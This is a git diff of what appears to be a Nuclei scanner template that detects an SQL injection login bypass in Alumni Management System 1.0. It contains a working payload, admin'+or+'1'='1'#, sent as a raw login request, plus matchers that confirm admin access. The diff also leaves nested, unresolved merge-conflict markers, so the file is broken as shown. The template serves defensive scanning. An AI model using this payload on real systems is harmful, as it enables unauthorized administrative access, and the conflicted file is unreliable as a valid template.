@@ -1,4 +1,5 @@
 id: alumni-management-sqli
+
 info:
   name: Alumni Management System 1.0 - SQL Injection
   author: arafatansari
@@ -9,6 +10,7 @@ info:
     - https://www.exploit-db.com/exploits/48883
 <<<<<<< HEAD
   tags: alumni,sqli,auth-bypass,cms
+<<<<<<< HEAD
 =======
     - https://nvd.nist.gov/vuln/detail/CVE-2020-29214
   classification:
@@ -18,6 +20,9 @@ info:
   tags: sqli,auth-bypass,cms,edb,alumni
 
 >>>>>>> 5d36d276 (add new stuff)
+=======
+
+>>>>>>> 18ddf72b (add new stuff)
 requests:
   - raw:
       - |
@@ -26,9 +31,11 @@ requests:
         Content-Type: application/x-www-form-urlencoded
 
         username=admin'+or+'1'%3D'1'%23&password=nuclei
+
       - |
         GET /admin/index.php?page=home HTTP/1.1
         Host: {{Hostname}}
+
     cookie-reuse: true
     matchers-condition: and
     matchers:
@@ -38,11 +45,13 @@ requests:
           - 'Welcome back Admin!'
           - 'Alumni List'
         condition: and
+
       - type: word
         part: body
         words:
           - '#login-form'
         negative: true
+
       - type: status
         status:
           - 200
